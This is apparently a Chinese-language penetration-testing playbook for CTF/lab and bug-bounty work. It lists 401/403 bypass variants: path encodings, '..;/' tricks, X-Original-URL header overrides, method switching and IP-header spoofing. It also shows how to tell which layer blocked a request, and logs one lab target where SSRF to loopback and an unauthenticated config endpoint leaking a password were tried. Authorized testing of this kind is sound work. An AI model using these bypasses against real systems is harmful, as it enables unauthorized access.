# 401 / 403 绕过（靶场照打 · 权限墙是高频考点）

> **靶场抬头（覆盖下方 SRC 口径）**：**"报 401/403 的路径"在靶场是明确的出分点**（实测多类鉴权绕过题，含 `..;/` 那类经典绕过），
> 下面的"不磨登录 HTML"只是说别去猜密码，**不代表放弃这条路**。绕过矩阵（按命中率排，一次全试）：
>
> | 维度 | 变体 |
> |---|---|
> | **路径编码** | `%2e` / `%2e%2e` / 双重编码 `%252e` / 大小写 `%2E` |
> | **分号与段** | `/admin/..;/`、`/xx/..;/admin/`、`/x/%2e%2e;/admin/`、`/;/admin`、尾随 `/.`、`//admin`、`/admin/.`、`/admin%20`、`/admin;` |
> | **头换路由** | `X-Original-URL: /admin`、`X-Rewrite-URL: /admin`、`X-Forwarded-Prefix`、`X-HTTP-Method-Override` |
> | **方法** | GET→POST / POST→GET、`X-HTTP-Method-Override: GET`、TRACE、OPTIONS 探允许方法 |
> | **来源** | 全套 IP 头矩阵（见 `../打穿短表.md` §Web 指纹）、`Referer` / `Origin` 伪造内部来源 |
> | **静态后缀/参数** | `/admin` → `/admin/..%2f`、加无关参数 `?debug=1`、`/admin.json`、`/admin;.css` |
>
> **★ 关键判据：看框架用的是"规范化前"还是"规范化后的 URI"做鉴权判定。**
> 同一个框架下 `/xx/..;/admin/` 与 `/x/%2e%2e;/admin/` 可能返回 200，而单独 `/admin..;/` 反而 404 —— **同一批变体里要逐个试，别试一个不通就下结论**。
>
> **假点**：拿到 200 但页面是静态欢迎页 ⇒ 没进真后台，继续换路径；403 来自 WAF 而非应用 ⇒ 隔 60 秒换干净 payload 复测（WAF 冷却会伪装成 403/401，见 `../打穿短表.md`）。

### ★ 用"响应差异"判断拦截发生在哪一层（429 暗渡实战，2026-10-08）

打 SSRF / 反向代理类题时，**同一个路径的三种失败形态指向三个不同的拦截层**，看清了才知道该绕谁：

| 现象 | 拦截层 | 对应打法 |
|---|---|---|
| **JSON 格式的 403**（如 `403 {"error":"Forbidden"}`） | **应用层**（框架/业务代码判定） | 绕框架规则：路径变体、方法覆盖、头伪造、参数污染 |
| **Connection Reset / RST**（响应时间明显跳变，如 2.15s） | **反向代理层**（mod_proxy / nginx 在转发前就断） | 打**代理本身的解析差异**（如 CVE-2021-40438 mod_proxy SSRF、`?unix:`、路径未规范化、`..;/`） |
| **Apache/nginx 静态 403**（HTML 错误页，无 JSON） | 服务器配置层（目录权限 / 访问控制） | 改后缀、路径穿越、编码变体 |

**429 实例**：
- `GET /admin` 裸访问 → `403 {"error":"Forbidden"}` ⇒ **应用层**判定
- `GET /api/fetch-url?url=http://127.0.0.1/admin` → **Connection Reset（2.15s）** ⇒ **代理层**拦截
- 同一目标、同一路径，只因"走没走代理"而落在不同层 ⇒ **这正是 mod_proxy 型漏洞的作用面**（代理自己的 URL 解析与后端不一致）

> **判据口诀**：**JSON 403 打应用，连接重置打代理，HTML 403 打配置。**
> 溯源价值：应急题问"拦截发生在哪一层"时，这一条就是答案。

### ★★ 更细的判定法（429 暗渡实战，2026-10-08）

#### 判据 A：看 403 的 `Content-Type` + 字节数，立刻分清是哪一层

| 403 形态 | 层 | 该干什么 |
|---|---|---|
| `Content-Type: application/json` + `{"error":"Forbidden"}` | **应用层** | 绕框架规则（路径变体 / 方法 / 头 / 参数污染） |
| `text/html; charset=iso-8859-1` + **精确 32 字节** + `Server: Apache/2.4.41` | **Apache 配置层**（如 `Require ip`） | **别再 fuzz 路径了** —— 见判据 B |
| 无响应体、连接被 Reset | 代理层 | 打代理自身解析差异（CVE-2021-40438 等） |

> 429 上这两层**同时存在**，极易误判成同一层：`/admin` 裸访问是应用层 JSON 403，而 `/admin/panelloginpage` 是 Apache 层 32 字节 HTML 403。

#### 判据 B：**"同一路径 +1 个字符就从 403 变 401" ⇒ 拦截是「路径集合精确匹配」**

实测（429）：
```
/admin/dashboard      → 401 {"error":"Unauthorized"}     ← 在白名单里，只差会话
/admin/dashboard?x=y  → 403 {"error":"Forbidden"}        ← 加 1 个字符就出局
/admin/dashboard/     → 403
/admin/config/        → 403        /admin/config → 200（直接泄漏凭据）
```
⇒ 后端逻辑形如 `if path not in {'/admin/config','/admin/dashboard'}: 403`
⇒ **这种"集合精确匹配"没有路径绕过空间** —— 唯一出路是**让请求从被信任的来源发出**（SSRF 回环 / 本地代理 / 内网跳板），**继续 fuzz 路径变体是纯浪费**。

**429 的完整卡点（记录备查）**：
- 入口 = 前端 bundle 里的 `GET /api/fetch-url?url=<ENCODED>`（唯一业务函数），内层 requests 直连，**可出网、可打本机**
- 应用层绕过成功：`/admin/config` 未授权直读 → 泄漏 `admin_password: SuperSecret123!` + `login_panel_path: /admin/panelloginpage`
- 但 Apache 对 `/admin/*` 做 `Require ip`（`403 Forbidden - Internal access only`）
- 85 组来源头矩阵（17 头名 × 5 值）= **0 差异**；Host 变体 6 组 = 全 403；去前缀等价入口 = 全 404
- **SSRF 只发 GET**（`?method=post`、`?headers=`、`?auth=`、`?cookies=`、POST body 全试过 → 内层仍 GET）
  ⇒ **拿到了凭据也无法完成 POST 登录**
- CVE-2021-40438：`unix:` 载荷 80 组 → 全 404 ⇒ **该镜像已回移补丁**
- **结论：环境级不可解**（不是手法问题）—— 记录为"需外部通道或题目镜像变更"

> **SRC 原始口径（仅对照）**：打开是登录页 / SSO → 表单壳听登录面判断，**不要**按本文件磨登录 HTML。发会话 / 重置 / 改绑 / 换票走 `authbypass-test.md`。业务 API 的 401/403：现场改 path / METHOD / 头自己打。
